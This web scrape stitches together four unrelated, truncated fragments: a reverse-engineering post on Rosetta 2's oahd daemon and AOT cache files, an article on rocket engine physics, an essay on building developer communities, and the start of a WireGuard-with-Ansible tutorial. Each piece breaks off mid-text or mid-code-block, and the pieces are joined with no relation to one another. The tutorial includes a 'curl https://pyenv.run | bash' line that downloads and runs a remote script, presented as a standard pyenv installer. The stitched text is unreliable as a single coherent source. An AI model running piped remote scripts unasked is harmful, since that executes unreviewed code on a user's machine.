<p>In addition to this, please install Xcode and Command Line Tools for Xcode to use Clang and LLDB.</p>
<h2 id="roles-of-oahd-and-oahd-helper">Roles of <code>oahd</code> and <code>oahd-helper</code></h2>
<p>First, let's create a command line application built for x86_64 and monitor system events (e.g., process creation, file-system activities, and memory mapping) when the x86_64 application runs.</p>
<pre><code>$ cat hello.c
#include &lt;stdio.h&gt;
int main() {
    puts("Hello World");
    return 0;
}
$ clang -arch x86_64 hello.c -o hello.out # specify x86_64 as the target architecture
$ file hello.out
hello.out: Mach-O 64-bit executable x86_64
</code></pre>
<p>To obtain several system events, I used EventMonitor created using the <a href="https://developer.apple.com/documentation/endpointsecurity">Endpoint Security Framework</a>.
I will release EventMonitor as an OSS soon.</p>
<p>Start EventMonitor and run <code>hello.out</code>.
The following jsonl file contains logs obtained by EventMonitor. The only events related to Rosetta 2 are extracted.</p>
<p><a href="https://ffri.github.io/ProjectChampollion/assets/event.jsonl">event.jsonl</a></p>
<p>When you look at the first line of the logs, you can see an event where <code>/bin/zsh</code> executes <code>hello.out</code>.</p>
<pre><code>{"event":{"log":{"args":[".\/hello.out"],"cwd":{"path":"\/Users\/konakagawa.ffri","path_truncated":false},"last_fd":4,"target":{"executable_path":"\/Users\/konakagawa.ffri\/hello.out","group_id":54132,"pid":54132,"ppid":48492,"session_id":48491}},"type":"exec"},"target_process":{"executable_path":"\/bin\/zsh","group_id":54132,"pid":54132,"ppid":48492,"session_id":48491}}
</code></pre>
<p>After the exec system call, <code>oahd</code> daemon checks for the file <code>/var/db/oah/16c6785d8fdab5ee2435f23dc2962ceda2e76042ea2ad1517687c5bb7358bf00/065b3f057e68a5474d378306e41d8b1e3e8e612b9cf9010b76449e02b607d7f0/hello.out.aot</code>.</p>
<pre><code>... (the oahd checks for the AOT file)

</code></pre>
<p>The file with the extension <code>.aot</code> contains the result of the translation from x86_64 to arm64.
We refer to this file as the AOT file.
The name <code>.aot</code> comes from Ahead-Of-Time, which means that the translation is performed before a thread actually starts.
The <code>oahd</code> is the management daemon for the AOT files.</p>
<p>Since this is the first time we run <code>hello.out</code>, the <code>oahd</code> cannot find the corresponding AOT file. So, it creates a new AOT file.
If the same binary in the same path has already been executed and the AOT file has been created, the <code>oahd</code> uses it.</p>
<p>You can see the folder named <code>/var/db/oah</code> in the above logs.
This folder has a <code>Oah.version</code> file at the top, which is supposed to contain the version information for Rosetta 2.
Also, this folder has <code>16c6785d8fdab5ee2435f23dc2962ceda2e76042ea2ad1517687c5bb7358bf00</code> folder.
We can see that multiple folders are containing AOT files in it.
The names of these folders are SHA-256 hash values that are calculated from both the contents of the file in x86_64 code and the path where it was executed.</p>
<pre><code># /var/db/oah contains the Oah.version file and 16c6785d8fdab5ee2435f23dc2962ceda2e76042ea2ad1517687c5bb7358bf00 folder

<p><em>Header image: SpaceX Raptor test fire (image source: SpaceX.)</em></p>



<figure><blockquote><p>“Anyone who sits on top of the largest hydrogen-oxygen fueled system in the world; knowing they’re going to light the bottom, and doesn’t get a little worried, does not fully understand the situation.”</p><cite>– Astronaut <a href="https://en.wikipedia.org/wiki/John_Young_(astronaut)" target="_blank" rel="noreferrer noopener">John Young</a>, first space shuttle commander</cite></blockquote></figure>







<p>What discussion of rocket physics is complete without an overview of rocket engines?</p>



<p>In our first installment, we learned about the <a rel="noreferrer noopener" href="https://www.marssociety.ca/2021/01/07/rocket-physics-the-rocket-equation/" target="_blank">Tyranny of the Rocket Equation</a> and how it governs all rocket design. In particular, we learned the importance of <em>specific impulse</em>, a measure of a rocket engine’s efficiency. You may have wondered, how can we maximize that?</p>



<p>This week, we will delve into the inner workings of liquid-fueled chemical rocket engines, the workhorses of space exploration, and the likeliest propulsion system to be used for the first human expedition to Mars. While the average rocket engine is less complex than the average car engine, the difficulty of its engineering lies in the extreme conditions it must endure while remaining lightweight.</p>



<p>The SpaceX Raptor is designed to supply its spacecraft with kinetic energy at a rate of 11 million horsepower<sup>1</sup> – the equivalent of four Hoover Dams, generated by an engine weighing approximately 1.5 tonnes. By comparison, one of the most powerful sports cars ever made, the Bugatti Veyron, has an engine weighing 0.5 tonnes (one-third as much), but can only generate a meager 1,200 horsepower.</p>



<p>Within a Raptor’s combustion chamber, methane and oxygen burn at temperatures hot enough to melt its walls (if it were not for regenerative cooling)<sup>2</sup>, at pressures exceeding those in SCUBA cylinders. The exhaust is expelled at over ten times the speed of sound. Why are such extreme conditions necessary?</p>



<div><figure><img loading="lazy" src="https://lh5.googleusercontent.com/-gWyV7H0RhjBFwPBt9KRPjhr4LOwZAzqP9I108mfJu3HGyephz7qgcZsc2X0lgO2vNjKdSZsR0WLfiPiCh0WlBJB_yDkwXJFVMPxgCHhU74PpqhrR1fn3Ke4kKOXdSfn9JpP1Ru9" alt="SpaceX Raptor Engine" width="819" height="419"><figcaption><em>Test of the vacuum version of the SpaceX Raptor engine (image source: SpaceX.)</em></figcaption></figure></div>



<h2><strong>Full of Hot Air</strong></h2>



<p>At the heart of all chemical – or more generally, all <em>thermal</em> – rocket engines is a simple and familiar thermodynamic principle: when a gas is heated, it expands. Chemical rockets burn fuel and oxidizer inside a combustion chamber. This imparts an enormous amount of heat to the gases, causing them to expand rapidly – in other words, an explosion occurs. In a rocket engine, this explosion is occurring <em>continuously</em> as fuel and oxidizer are pumped in. </p>



<div><figure><img src="https://lh5.googleusercontent.com/JK53Q4FyKMRoUx6ZNnzxuLLilxEp9luQoX_b74aOjhTzv_Mci9jGRvoyLiBAq6deABNNZqh9MQagvqnoDf8Z5WM4n0VU8h991LaocSsLCw4U1KK_HRX60rGv6fu2NRg-NtnmePNZ" alt="Rocket Combustion Chamber"><figcaption><em>The pressure of the hot gases pushing against the inside of the combustion chamber and nozzle generates thrust (image source: Wikimedia Commons.)</em></figcaption></figure></div>



<p>The hot gases are then forced through a constriction (thus converging), accelerating them to the speed of sound. Then, they continue into the nozzle which expands it (thus diverging), accelerating them further to hypersonic velocities<sup>3</sup>. As it expands and pushes the rocket forward, the pressure and temperature of the gas both fall. In exchange, its velocity increases. The pressure of the escaping gases pushing against the walls of the engine drives the rocket forward. This converging-diverging nozzle arrangement is known as a <em>de Laval nozzle</em>, which is found in all rocket engines ranging from model rockets to the Saturn V’s mighty F-1 engines.</p>



<p>Essentially, a rocket is an efficient way of converting the fuel’s chemical energy into kinetic energy. When the propellant is combusted, propellant energy is converted into thermal energy. Because the engine resists the explosion, the gas reaches high pressures. As the gas flows through the nozzle, it exchanges thermal and pressure energy for kinetic energy.</p>



<p>In other words, the explosion pushes back against the combustion chamber and nozzle, forcing the rocket forward.</p>



<p>To increase the thrust of the rocket, one can add more engines or increase the rate of propellant consumption. However, this will not improve the rocket’s delta-V. In a nutshell, delta-V is the ability of a rocket to change its velocity, which in turn determines how difficult of a mission it can perform.</p>



<p>In fact, adding engines actually decreases delta-V due to their added mass. Recall from our previous <a rel="noreferrer noopener" href="https://www.marssociety.ca/2021/01/07/rocket-physics-the-rocket-equation/" target="_blank">installment on the Rocket Equation</a> that there are only two ways to improve delta-V: carry more fuel or improve specific impulse. Specific impulse is how efficiently each kilogram of fuel drives the rocket forward; to improve this efficiency, we need to design and optimize our engines carefully.</p>



<p>Here are the four most common strategies to improve performance:</p>



<p>First, we can <strong>choose fuel-oxidizer combinations that result in an exhaust with lightweight molecules.</strong> The lighter the molecules of the exhaust, the faster they will go at a given temperature, increasing the engine’s exhaust velocity – and consequently, its specific impulse. Accordingly, high-performing chemical fuels tend to have large amounts of hydrogen, as hydrogen is the lightest known element.</p>



<div><figure><img loading="lazy" width="1024" height="576" src="https://www.marssociety.ca/wp-content/uploads/Molecular-weight-exhaust-1024x576.png" alt="Rocket Physics" srcset="https://www.marssociety.ca/wp-content/uploads/Molecular-weight-exhaust-1024x576.png 1024w, https://www.marssociety.ca/wp-content/uploads/Molecular-weight-exhaust-300x169.png 300w, https://www.marssociety.ca/wp-content/uploads/Molecular-weight-exhaust-768x432.png 768w, https://www.marssociety.ca/wp-content/uploads/Molecular-weight-exhaust-1536x864.png 1536w, https://www.marssociety.ca/wp-content/uploads/Molecular-weight-exhaust-600x338.png 600w, https://www.marssociety.ca/wp-content/uploads/Molecular-weight-exhaust.png 1920w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><em>A comparison showing that exhaust velocity is higher with light molecules than with heavy molecules (image by author, CC BY 4.0.)</em></figcaption></figure></div>



<p>The best-performing combination in use is hydrogen and oxygen<sup>4</sup>, which burns to produce hot steam. Burning heavier, hydrocarbon fuels like methane or kerosene produces not only steam, but also carbon dioxide and some other messy compounds. The higher mass of carbon dioxide molecules reduces the engine’s exhaust velocity, lowering its specific impulse.</p>



<div><p>Given these caveats, why do rockets use any fuel besides hydrogen and oxygen? </p><p>While having excellent performance, liquid hydrogen causes numerous headaches when it comes to storage. This is because it must be kept at an extremely cold -253 °C, it <a href="https://en.wikipedia.org/wiki/Hydrogen_embrittlement">causes metals to become brittle</a>, it easily leaks through the smallest seams and cracks, and leaks are difficult to detect (just to name a few). Furthermore, it has only 7% the density of water, meaning that large, heavy tanks are required to store it (which partially cancels out the efficiency gains.)</p></div>



<p>The extremely low boiling point of hydrogen is perhaps the worst of these problems. -253 °C is a mere twenty degrees above absolute zero, with helium being the only known substance with a lower boiling point. The walls of the Space Shuttle’s external fuel tank were just over six millimetres thick, and they had to insulate against a temperature difference of over 270 degrees. This is a very hard thing to do, to put it mildly.</p>



<p>The fragile insulating foam required frequently broke off in flight, damaging the orbiter’s heat shield. This damage led to the near-destruction of <a href="https://en.wikipedia.org/wiki/STS-27">STS-27 <em>Atlantis</em></a> during reentry. NASA evidently did not learn their lesson; <a href="https://en.wikipedia.org/wiki/STS-107">STS-107 <em>Columbia</em></a> was actually destroyed on reentry for the same reason, fifteen years later. There were no survivors.</p>



<p>While kerosene has poorer performance and tends to leave messy carbon deposits in the engine, it is much denser and easier to store. This is why kerosene and other less efficient fuels tend to be more commonly used than hydrogen.</p>



<p>The next time you watch a rocket launch, observe the colors of the engine exhaust plumes. You may be able to identify the fuel. As an example, kerosene engines tend to produce soot. The incandescent glow of this soot is why the Saturn V’s first stage, fueled by kerosene and oxygen, had a brilliant fiery exhaust flame. On the other hand, the Space Shuttle’s RS-25 engines, burning hydrogen and oxygen, had near-transparent exhaust.</p>



<div><figure><img loading="lazy" width="988" height="618" src="https://www.marssociety.ca/wp-content/uploads/comparison-rp1-lh2-1.jpg" alt="Rocket engine exhaust " srcset="https://www.marssociety.ca/wp-content/uploads/comparison-rp1-lh2-1.jpg 988w, https://www.marssociety.ca/wp-content/uploads/comparison-rp1-lh2-1-300x188.jpg 300w, https://www.marssociety.ca/wp-content/uploads/comparison-rp1-lh2-1-768x480.jpg 768w, https://www.marssociety.ca/wp-content/uploads/comparison-rp1-lh2-1-600x375.jpg 600w" sizes="(max-width: 988px) 100vw, 988px"><figcaption><em>A comparison of exhaust flames. The Saturn V F-1 engine’s incandescent kerosene-oxygen flame (left) and the Space Shuttle RS-25 engine’s transparent hydrogen-oxygen flame (right) (image credit: NASA.)</em></figcaption></figure></div>



<p>Other fuel combinations such as <a href="https://en.wikipedia.org/wiki/Aerozine_50">Aerozine 50</a> and dinitrogen tetroxide may also produce transparent exhaust plumes. This combination was used by the Apollo lunar ascent modules, for instance, which is why the flame is invisible:</p>



<figure><div>
<p><iframe title="Apollo 17 Lunar Liftoff HD (Inside and Outside view)" width="1200" height="675" src="https://www.youtube.com/embed/XlGis35Epvs?start=180&amp;feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
</div></figure>



<p>Secondly, we can <strong>increase the combustion temperature. </strong>This will increase the amount of energy available to the gases, causing their molecules to move faster, improving the engine’s exhaust velocity (and by extension, specific impulse.) High temperatures can generally be achieved by using a more energetic fuel-oxidizer combination. However, high temperatures also require tougher materials and more powerful cooling systems to keep the engine from burning away.</p>



<div><figure><img src="https://lh6.googleusercontent.com/LXz7gNQbS1hYq-5-gzHr5gIDCEKGXvXcT7qGPdQqOJrs0CRxTJgT8cH1N8DpN4UuH-1dLUDtB6tgdUYkUH7PjSu8EbsnOzk833lr3VLcMxuFIhJhGWovONFeZBojy480NML87l90" alt="Rocket Physics"><figcaption><em>A comparison showing that exhaust velocity is higher at higher combustion chamber temperatures (image by author, CC BY 4.0.)</em></figcaption></figure></div>



<p>Generally, higher temperatures result in higher efficiencies, and the highest possible temperature usually occurs when the fuel and oxidizer are mixed in the perfect ratio, known as the <em>stoichiometric</em> ratio in chemistry.</p>



<p>However, the fuel-oxidizer ratio that results in the best possible specific impulse may actually be slightly off from the stoichiometric ratio. Recall that lowering the mass of the molecules in the exhaust <strong>also<em> </em></strong>helps improve the engine’s performance. Fuels tend to have lower molecular weights than oxidizers, so adding an excess of fuel can actually <em>improve</em> performance up to a point, by lowering the average mass of the exhaust molecules. This is known as ‘fuel-rich combustion’ or ‘burning rich’.</p>



<p>For example, the hydrogen-oxygen combination gets its high performance by both burning energetically and having lightweight exhaust molecules. A hydrogen molecule is only one-sixteenth the mass of an oxygen molecule, meaning that having some excess, unburned hydrogen in the exhaust can significantly improve performance.</p>



<p>There is also another reason to burn rich: corrosion. The infernal temperatures (over 3,000 °C) and pressures (hundreds of atmospheres) found inside a rocket engine make the combusting gases far more reactive than they are at normal conditions.</p>



<p>Corrosion is an especially serious problem with oxygen. Oxygen is already highly reactive in normal conditions (if you don’t believe me, try setting your hair on fire.) At the temperatures and pressures found inside a rocket engine, it will enthusiastically combust with almost anything, including a wide variety of metals. An excess of fuel …</p></div></div>

<p>There's a big shift going on in how developer tools companies approach their userbase. In the past week alone, I've had 3 chats with startups that all concluded with some version of:</p>
<blockquote>
  <p>"By the way, we're really looking to ramp up our community effort right now. If you can think of anyone who can help us build a developer community, can you send them my way?"</p>
</blockquote>
<p>One week, three pings. If this isn't a big trend already, it's at least worth writing about (per <a href="https://www.swyx.io/three-strikes/">my Three Strikes rule</a>). <strong>Who builds developer communities, why are companies investing in them, and <em>why now</em>?</strong></p>

  <h2 id="whos-job-is-it-anyway"><a href="#whos-job-is-it-anyway">Who's Job Is It Anyway?</a></h2>
  <p>Developers have had a long history of spontaneous community formation dating back to the IRC and BBSes of yore. (<em>Misery loves company?</em>) There is still a strong ethos of self organized community in modern dev culture, but the vast majority of this lies on the shoulders of a small group of under-funded volunteers.</p>
  <p>But in the last couple decades, company-centric communities, where <strong>the community is almost the entire competitive moat</strong> of the company, have become a central part of developer life:</p>
  <ul>
    <li><strong>StackOverflow</strong> serves <a href="https://stackexchange.com/sites?view=list#traffic">11m visits a day</a> with community contributed Q&amp;A's and sells ads and knowledge base software on the side.</li>
    <li><strong>GitHub</strong> builds developer collaboration software, but at its core is a <a href="https://octoverse.github.com/">56m-developer</a> social network atop Git.</li>
    <li><strong>Hacker News</strong> (serving at least <a href="https://news.ycombinator.com/item?id=16076041">4m a day</a>) is a big part of Y Combinator's unfair advantage in getting both founder mindshare and hiring talent.</li>
  </ul>
  <p>You would expect that this realization would spawn a dedicated discipline to prioritize it, in the same way that <a href="http://www.paulgraham.com/growth.html">Startups = Growth</a> justifies the need for a <a href="https://andrewchen.co/how-to-be-a-growth-hacker-an-airbnbcraigslist-case-study/">Growth Hacker</a> at every company serious about growth.</p>
  <p>But as far as I can tell, it hasn't happened.</p>
  <p>Sure, companies do hire community managers to groom their forums and post inoffensive memes (<em>j/k of course, good community managers do much more than this</em>). Some developer advocates may focus on community, but most developer evangelists create content and do outreach to other communities, to "meet developers where they are". Marketing folks might run the company mailing list, host webinars, or organize conferences, all mini-communities in their own right. Everyone intuitively gets the importance of community, and does their best within given boundaries.</p>
  <p>But who's job is it to define the overall community strategy, and has the resources to develop it as aggressively as engineering? If this describes someone in your management team, great. But often the community builders are at the bottom of the totem pole.</p>
  <p>The Venn diagram of people who can scale code and people who can scale community is going to be <a href="https://www.heavybit.com/library/podcasts/jamstack-radio/ep-51-community-over-code-with-shawn-wang-of-netlify/">exceedingly valuable</a>. You don't strictly <strong>need</strong> to be technical to run community — Ben Popper, StackOverflow's Director of Content, is <a href="https://stackoverflow.blog/2019/10/22/ben-popper-is-the-worst-coder-in-the-world/">still new to code</a> — but developers can tell when they aren't talking to a technical person and that limits the depth of conversation. A technical community builder will have instincts informed by direct personal experience, and be able to empathize with member needs and make targeted recommendations.</p>
  <p>The job title probably won't stay "community builder", by the way. <a href="https://twitter.com/patio11/status/1299217439671025665?s=20">Patrick McKenzie once observed</a> that the DevOps movement led to "a once-in-a-lifetime upgrade in status, impact, authority, and career prospect" for sysadmins. I think a similar rebrand is due. As community goes from a side activity to a core driver of product, support, and marketing (<a href="https://blog.usejournal.com/the-rise-of-the-community-department-232d427de65f">great thoughts from Lisa Xu on this</a>), the status and pay change will need a new name for people to rally behind.</p>
  <p>What shall we call it? "Community <a href="https://dangerouslyawesome.com/2014/04/community-management-tummling-a-tale-of-two-mindsets/">Tummler</a>"? "Community Developer"? Let me know if you have a better name. I've settled on "Technical Community Builder" for now, in the same way that Microsoft and Amazon have Technical Product Managers.</p>
</section>
<section>
  
  <p>TL;DR: <strong>Traditional marketing and support isn't cutting it</strong>.</p>
  <p>Devtools companies get that "build it and they will come" usually doesn't work. The sub-industries of technical marketing and developer relations are well developed enough now that there are <a href="https://learn.samjulien.com/getting-started-in-developer-relations">books</a> and <a href="https://www.devrelcon.net/">conferences</a> about it. We get that marketing can be just as important as product. (<em>Let's leave the topic of "how much devrel and marketing overlap" for a future post...</em>)</p>
  <p>But a buyer's journey can start long before — and continue long after — their first contact and passage through the marketing funnel:</p>
  <ul>
    <li>Marketing attribution in developer tools is kayfabe — we play at tracking Twitter clickthroughs and podcast direct response, but everyone in marketing knows you need at least <a href="https://www.socialmediatoday.com/content/seven-touches-basic-marketing-principle-action">7-13 touches</a> before someone really considers you. As a developer I often wait out <em>an entire year</em> after hearing about something before even trying it out, just to see if it has staying power.</li>
    <li>After buying into a solution, I still need help to be successful with the tool. Developer tools are ultimately creative tools, and sometimes the imagination needs a little inspiration. Setup hurdles need to be overcome. If I buy something and end up not using it, it's going into the do-not-use pile for a very, very long time before I ever give it another shot.</li>
  </ul>
  <p>This adoption process needs to turn from a mostly-transactional, finite game, to a relationship-based infinite game. You might envision Community as carefully designing the broader environment around the traditional sales and marketing funnel:</p>
  <p>
    <img src="https://user-images.githubusercontent.com/6764957/109989150-31fee000-7d43-11eb-9818-59daf4797147.png" alt="Developer Journey">
  </p>
  <p>Or you could <strong>reject the funnel</strong> altogether. To quote <a href="https://twitter.com/patrickjwoods/">Patrick Woods</a>:</p>
  <blockquote>
    <p>"Characterizing the developer journey as a linear funnel doesn’t really tell the whole story, as it’s essentially scoped to awareness and conversation — the journey is much more complex. I think onboarding to the community itself, retaining over time, and advocating for others to join, is a huge part of the journey... In this world, you want to understand how folks are engaging with the community <em>as well as</em> with the company/product, with product metrics (activation, adoption, etc) existing as second-order effects of the community. <a href="https://github.com/orbit-love/orbit-model">The Orbit Model</a>, versus the funnel, tries to tell this nonlinear and comprehensive story."</p>
  </blockquote>
  <p>When most developers make technical choices, you are just as likely to hear them praise the strength of the "ecosystem" (aka a community, with thriving third parties) as they do the core technical merits. In terms of <a href="https://twitter.com/swyx/status/1360882870638665731">the Rogers curve</a>, this is the kind of argument made by "mainstream" developers:</p>
  <p>
    <img src="https://user-images.githubusercontent.com/6764957/109990452-5e672c00-7d44-11eb-8a0b-159491db2d6b.png" alt="Community crossing the chasm">
  </p>
  <p><strong>Community is how developer tools cross the chasm</strong> from early adopters to the majority. Every devtools company looking to scale eventually has to figure this out, whether consciously or otherwise.</p>
  <p>Other arguments in bullet point form, but feel free to request elaborations:</p>
  <ul>
    <li>
      <p><strong>Retention</strong>: Build product and they may not come, but <strong>build community and they will stay.</strong></p>
    </li>
    <li>
      <p><strong>Hiring</strong>: Community can just as easily net you employees as it does users and customers.</p>
    </li>
    <li>
      <p><strong>Marketing</strong>: Community is highest-signal social proof/word of mouth you <strong>cannot</strong> buy.</p>
    </li>
    <li>
      <p><strong>Moat</strong>: Community is a "feature" that cannot be copied. By Hamilton Helmer's 7 Powers Framework (<em><a href="https://www.sachinrekhi.com/7-powers-hamilton-helmer">the strategy framework du jour</a></em>), Community helps you gain Network Economies, increase Switching Costs and Corner one of the most precious resources on Earth: Developers!.</p>
    </li>
    <li>
      <p><strong>Scaling</strong>: Community is many-to-many, where Marketing/Devrel is one-to-many. The value of a community-focused user base scales by Metcalfe's law instead of Sarnoff's law. A thriving third-party <em>ecosystem</em> scales by Reed's law — even better!</p>
      <p>
        <img src="https://user-images.githubusercontent.com/6764957/109877251-bd2d9680-7cad-11eb-8a18-4b4330745d6c.png" alt="Reed's law">
      </p>
    </li>
    <li>
      <p><strong>Risks</strong>: But you also do not "own" your community - the best you can do is lead by example, encourage helpful behavior, and enforce clear codes of conduct. Community is "user-generated content", and that bears with it great responsibility. Poor handling can <a href="https://www.fastcompany.com/90401254/ea-gets-a-guinness-world-record-for-the-most-downvoted-comment-in-reddit-history">backfire horrifically</a>.</p>
    </li>
    <li>
      <p><strong>Free Work?</strong> Community members can answer questions to each other and develop integrations to help you grow beyond your limited resources. To avoid expecting members to "do free work", this effort must be reciprocated by careful stewardship.</p>
    </li>
    <li>
      <p><strong>Lifespan</strong>: One of the best measures of community success is when your users' relationship with you outlasts their current employment. <strong><a href="https://hunterwalk.medium.com/coming-for-the-content-staying-for-the-community-started-with-video-games-or-maybe-religion-5083f3773a2">Come for the software, stay for the community</a></strong>. Help your users get jobs, help your customers hire your users, and you will have fans for life.</p>
    </li>
    <li>
      <p><strong>Open Source</strong>: Commercial Open Source companies must foster a viable community to be successful open source, rather than being de-facto "source available". In <a href="https://www.thepullrequest.com/p/nadia-eghbal">Nadia Eghbal's terms</a>, more Federations than Stadiums, but both are definitely preferable over Clubs and Toys.</p>
    </li>
    <li>
      <p><strong>Product Insights</strong>: Speaking to users helps you build things people want, but often these conversations are done by outreach (user survey or feedback session) rather than observation (<em>in situ,</em> natural environment). Community is where your deepest and most authentic user insights will originate.</p>
    </li>
  </ul>
  <p>All in all — <strong>a devtools company that prioritizes an engaged and inclusive developer community will run circles around one that doesn't.</strong></p>
  <p>There are multiple ways to do this well, but I am particularly fond of community that "serves a bigger purpose". A community that is strictly centered around a company (eg Dreamforce → Salesforce) is less appealing than one with room for multiple players (eg No Code → Webflow, Jamstack → Netlify), at least while you aren't yet a decacorn. Every great community is a great marketplace (<em>tbc in a future post...</em>), and every marketplace is a kind of platform, and every platform must respect <a href="https://twitter.com/swyx/status/1360729115372920832">the Bill Gates Line</a> with its participants.</p>

  <h2 id="why-now"><a href="#why-now">Why Now?</a></h2>
  <p>Dev Community has felt fringe for as long as I've been involved. I always felt like a bit of a middle schooler talking about <a href="https://www.swyx.io/moderating-rreactjs/">my /r/reactjs work</a> to companies, like "that's nice dear, but let's talk about more serious work now". I have friends running other popular Discords and forums that feel the same way.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In my [previous blogpost](https://www.tangramvision.com/blog/what-they-dont-tell-you-about-setting-up-a-wireguard-vpn), we set up a WireGuard VPN server and client and learned about various configuration options for WireGuard, how to improve VPN server uptime, how to relay traffic, and more. Setting up a server and client like that is a lot of work! If the server dies or you want to set up a new server (maybe for a friend or family member this time), you have to go back to the walk-through and follow all the steps, remembering if you deviated from those instructions at any point.</p><p>There's a better way — automation! If you're only going to do a thing once (e.g. set up a VPN), investing in automation probably doesn't make sense. But if you anticipate doing a thing repeatedly, automating it frees up your time to learn and accomplish more in the future. You can also share your automation, empowering others to build and achieve more, faster.</p><p>Automation is the heart of computing, and many different automation tools and approaches have sprung up over time. For our project of automating VPN server setup, we can consider a variety of tools:</p><p>- Shell scripts<br> &nbsp; &nbsp;- The simplest approach from a tooling perspective, writing shell scripts would involve running the commands from the [previous WireGuard tutorial blogpost](https://www.tangramvision.com/blog/what-they-dont-tell-you-about-setting-up-a-wireguard-vpn), using `ssh` for the commands that run on the server and `rsync` to copy configurations files to the server.<br>- SSH scripting libraries like [Capistrano](https://capistranorb.com/documentation/overview/what-is-capistrano/) or [Fabric](http://www.fabfile.org/)<br> &nbsp; &nbsp;- If shell scripting isn't ideal, there are libraries that expose similar scripting functionality in a more ergonomic interface for developers familiar with higher-level languages like Ruby and Python.<br>- Infrastructure/configuration automation tools like [Puppet](https://puppet.com/), [Chef](https://www.chef.io/), or [Ansible](https://www.ansible.com/)<br> &nbsp; &nbsp;- Tools in this category are even more specialized for automating server infrastructure and configuration, often including an ecosystem of packages and plugins to automatically set up or configure nearly anything you can think of.<br>- Infrastructure-as-code tools like [Terraform](https://www.terraform.io/)<br> &nbsp; &nbsp;- Infrastructure-as-code (IaC) tools have a lot of overlap with the above category, but support provisioning cloud resources in a more first-class/native way.<br>- Containers like [Docker](https://www.docker.com/)<br> &nbsp; &nbsp;- You could also run WireGuard in containers, deploying a server-configured container image to a cloud provider and running a client-configured container image locally to connect to the server. There are [a few](https://medium.com/@firizki/running-wireguard-on-docker-container-76355c43787c) [existing](https://hub.docker.com/r/linuxserver/wireguard) [examples](https://blog.jessfraz.com/post/installing-and-using-wireguard/) of this approach.</p><p>For this tutorial, I'm going to focus on the middle category above — infrastructure/configuration automation tools — and specifically, I'll focus on Ansible. There is a [great comparison of different tools in this area](https://blog.gruntwork.io/why-we-use-terraform-and-not-chef-puppet-ansible-saltstack-or-cloudformation-7989dad2865c) by Gruntwork and, even though that article favors Terraform, Ansible is still a useful general-purpose tool, especially if you're working with servers that aren't "in the cloud", such as a Raspberry Pi at home.</p><p>Let's get started with automating VPN setup with Ansible! By the end of this article, we'll be able to set up a VPN server and client with a single command. Similar to the previous blogpost, I'll use Ubuntu 20.04 and DigitalOcean droplets.</p><p># Setting up Ansible</p><p>Ansible can be [installed via an OS package manager](https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html) like `apt`, but I prefer to use `pip` so I can get the latest updates and avoid cluttering system package management with third-party PPAs (Personal Package Archives). We'll also use `pyenv` (as suggested by [Hypermodern Python](https://medium.com/@cjolowicz/hypermodern-python-d44485d9d769#6e8a)) to make sure we're not breaking or cluttering the system Python installation. Install `pyenv` with the following:</p><p>```bash<br># From https://github.com/pyenv/pyenv/wiki#suggested-build-environment<br>sudo apt-get update</p><p>sudo apt-get install --no-install-recommends make build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev liblzma-dev</p><p>curl https://pyenv.run | bash<br>```</p><p>It's a good habit when a tutorial gives you `curl &lt;url&gt; | bash` to open up that URL and see what it's going to do. In this case, you'll see that it'll download and execute a shell script on GitHub that will clone 6 repos from GitHub to your `~/.pyenv` folder and prompt you to add a few lines to your shell's initialization script.</p><p>Follow the output prompt from above, which asks you to put lines like the below in your shell initialization script (e.g. `~/.bashrc` if you use the bash shell). Make sure to fill in your own username!</p><p>```bash<br>export PATH="/home/YOUR_USERNAME/.pyenv/bin:$PATH"<br>eval "$(pyenv init -)"<br>eval "$(pyenv virtualenv-init -)"<br>```</p><p>Install a recent python version:</p><p>```bash<br># List available python versions<br>pyenv install --list</p><p># Install a specific version<br>pyenv install 3.9.2</p><p># (Suggested) If you want to always use that version when running `python`<br># in your terminal<br>pyenv global 3.9.2<br>```</p><p>If you want, you can also create a [virtualenv](https://virtualenv.pypa.io/en/latest/) to further isolate the Ansible installation, and make that virtualenv automatically activate when you're in a particular folder/repo. That would look like:</p><p>```bash<br># (Optional)</p><p># Feel free to pick a different virtualenv name than "ansible-tutorial"<br>pyenv virtualenv 3.9.2 ansible-tutorial</p><p># Create a .python-version file that pyenv will find when your shell is in the <br># same directory (or a sub-directory) and automatically activate the named<br># virtualenv<br>pyenv local ansible-tutorial<br>```</p><p>Install the `ansible` pip package, which will install various command-line tools, including `ansible-playbook`, which we'll use to run a "playbook" of commands that will set up a VPN server and client for us.</p><p>```bash<br>pip install ansible</p><p># Confirm installation worked<br>ansible --version<br>```</p><p># Get a Server</p><p>To use Ansible for a VPN server, we need... a server! Ansible could provision a server from a cloud provider for us (and I'll touch on this briefly later), but we'll keep our playbook hardware-provider-agnostic for now, so you can run it as easily against a cloud server as a Raspberry Pi on your home network. I'm going to [create a $5/month DigitalOcean droplet](https://www.digitalocean.com/docs/droplets/how-to/create/) to test against, but you could also [use Vagrant](https://docs.ansible.com/ansible/latest/scenario_guides/guide_vagrant.html) (to test against a local VM) or any server you can SSH to.</p><p>Testing Ansible playbooks against VMs, rather than a bare-metal machine, comes with an advantage — after you've written the playbook, you can start a new, empty VM and test the whole playbook start to finish to ensure that it works consistently.</p><p># Connecting to the Server with Ansible</p><p>Once you have your server or VM, take note of its IP address use it to create an `inventory.ini` file like the below:</p><p>```<br>[vpn]<br>vpn_server ansible_host=203.0.113.1 ansible_user=root<br>```</p><p>An [inventory file](https://docs.ansible.com/ansible/latest/user_guide/intro_inventory.html) tells Ansible what servers it can act upon and how to access them. Let's use the above inventory file as an example. When we run Ansible and target the `vpn` **group** of servers or the `vpn_server` **host**, it will try to connect to the server using a command like:</p><p>```bash<br>ssh root@203.0.113.1<br>```</p><p>So, if you can't SSH to the server, then Ansible won't be able to connect either!</p><p>Connecting to the server with an SSH key is strongly recommended! [Add your SSH key to your server](https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys-2) to connect without needing a password. If you must connect with a password, you can `sudo apt install sshpass` and then provide your SSH password when using Ansible by adding the `--ask-pass` flag to all ansible commands.</p><p>Let's test to make sure that Ansible can connect to the server:</p><p>```bash<br>ansible -i inventory.ini -m ping vpn<br>```</p><p>This runs the [ping Ansible 